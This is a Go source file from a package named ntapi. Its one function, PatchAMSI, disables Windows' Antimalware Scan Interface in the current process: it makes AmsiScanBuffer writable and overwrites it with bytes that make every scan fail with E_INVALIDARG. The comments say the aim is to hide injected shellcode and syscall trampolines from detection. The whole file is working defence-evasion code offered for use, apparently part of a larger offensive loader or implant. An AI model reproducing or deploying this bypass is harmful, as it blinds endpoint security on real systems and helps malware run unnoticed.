package ntapi

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// PatchAMSI disables the Antimalware Scan Interface in the current process
// by patching AmsiScanBuffer in amsi.dll to immediately return E_INVALIDARG.
//
// This prevents AMSI-based scanning that could flag in-memory syscall
// trampolines or injected shellcode patterns as malicious.
//
// The patch overwrites the first 6 bytes:
//
//	mov eax, 0x80070057   ; E_INVALIDARG
//	ret
func PatchAMSI() error {
	amsi, err := windows.LoadLibrary("amsi.dll")
	if err != nil {
		// amsi.dll not loaded — nothing to patch
		return nil
	}

	scanBuf, err := windows.GetProcAddress(amsi, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("resolve AmsiScanBuffer: %w", err)
	}

	// Change page protection to RWX
	var oldProtect uint32
	err = windows.VirtualProtect(scanBuf, 6, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect RWX: %w", err)
	}

	// Write patch: mov eax, 0x80070057 / ret
	patch := (*[6]byte)(unsafe.Pointer(scanBuf))
	patch[0] = 0xB8 // mov eax, imm32
	patch[1] = 0x57
	patch[2] = 0x00
	patch[3] = 0x07
	patch[4] = 0x80
	patch[5] = 0xC3 // ret

	// Restore original protection
	_ = windows.VirtualProtect(scanBuf, 6, oldProtect, &oldProtect)

	return nil
}
